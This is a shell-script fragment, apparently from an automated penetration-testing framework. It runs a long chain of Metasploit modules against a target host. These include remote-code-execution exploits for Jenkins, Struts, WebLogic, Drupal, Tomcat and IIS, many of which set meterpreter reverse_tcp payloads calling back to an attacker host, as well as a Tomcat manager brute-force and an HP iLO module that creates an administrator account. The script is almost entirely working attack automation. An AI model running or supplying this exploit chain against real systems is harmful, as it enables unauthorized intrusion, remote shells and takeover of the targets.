      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg SSL false; run; set PATH /uploads/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING MANAGEENGINE DESKTOP CENTRAL RCE EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/windows/http/manageengine_connectionid_write; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-manageengine_connectionid_write.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE TOMCAT ENUMERATION $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use scanner/http/tomcat_enum; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_enum.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_enum.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_enum.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_enum.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE TOMCAT MANAGER LOGIN BRUTEFORCE $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_mgr_login.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_mgr_login.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_mgr_login.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_mgr_login.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING JENKINS ENUMERATION $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use scanner/http/jenkins_enum; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; set TARGETURI /; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_mgr_login.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING JENKINS SCRIPT CONSOLE RCE EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use multi/http/jenkins_script_console; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; setg SSL "$SSL"; set TARGET 0; run; set TARGETURI /; run; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set TARGET 1; run; set PAYLOAD linux/x86/meterpreter/reverse_tcp; run; set TARGET 2; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run; set PAYLOAD linux/x86/meterpreter/reverse_tcp; run; set TARGETURI /; run; set TARGET 1; run; set TARGET 2; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_script_console.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_script_console.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_script_console.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_script_console.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ELASTICSEARCH DYNAMIC SCRIPT JAVA INJECTION EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING DRUPALGEDDON HTTP PARAMETER SQL INJECTION CVE-2014-3704 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; setg URI /drupal/; setg TARGETURI /drupal/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use scanner/http/glassfish_traversal; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw 2> /dev/null        
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT "$PORT"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT "$PORT"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOITS $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/htp/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT CVE-2017-8917 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WORDPRESS REST API CONTENT INJECTION CVE-2017-5612 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use auxiliary/scanner/http/wordpress_content_injection; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ORACLE WEBLOGIC WLS-WSAT DESERIALIZATION RCE CVE-2017-10271 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT "$PORT"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA OGNL INJECTION CVE-2017-5638 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use multi/http/struts2_content_type_ognl; setg RHOST "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE STRUTS 2 SHOWCASE OGNL RCE CVE-2017-9805 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE STRUTS 2 REST XSTREAM RCE CVE-2017-9791 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/tomcat_jsp_upload_bypass; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING APACHE STRUTS 2 NAMESPACE REDIRECT OGNL INJECTION CVE-2018-11776 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/struts2_namespace_ognl; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use auxiliary/scanner/http/cisco_directory_traversal; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; setg URI /drupal/; setg TARGETURI /drupal/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ORACLE WEBLOGIC SERVER DESERIALIZATION RCE CVE-2018-2628 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/misc/weblogic_deserialize; setg RHOST "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw 2> /dev/null
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING OSCOMMERCE INSTALLER RCE CVE-2018-2628 $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      msfconsole -q -x "use exploit/multi/http/oscommerce_installer_unauth_code_exec; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw
      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.txt 2> /dev/null
      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw 2> /dev/null